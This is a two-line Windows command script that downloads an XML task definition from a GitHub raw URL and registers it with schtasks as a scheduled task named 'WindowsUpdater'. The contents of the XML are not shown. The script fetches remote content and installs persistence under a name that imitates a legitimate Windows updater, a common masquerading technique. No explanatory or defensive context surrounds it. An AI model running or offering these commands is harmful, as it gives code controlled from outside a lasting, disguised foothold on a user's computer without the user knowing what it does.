curl https://raw.githubusercontent.com/william-lundgren/Funkydevice/refs/heads/main/el-ahrairah.xml -o %USERPROFILE%\el-ahrairah.xml
schtasks /create /tn "WindowsUpdater" /xml %USERPROFILE%\el-ahrairah.xml
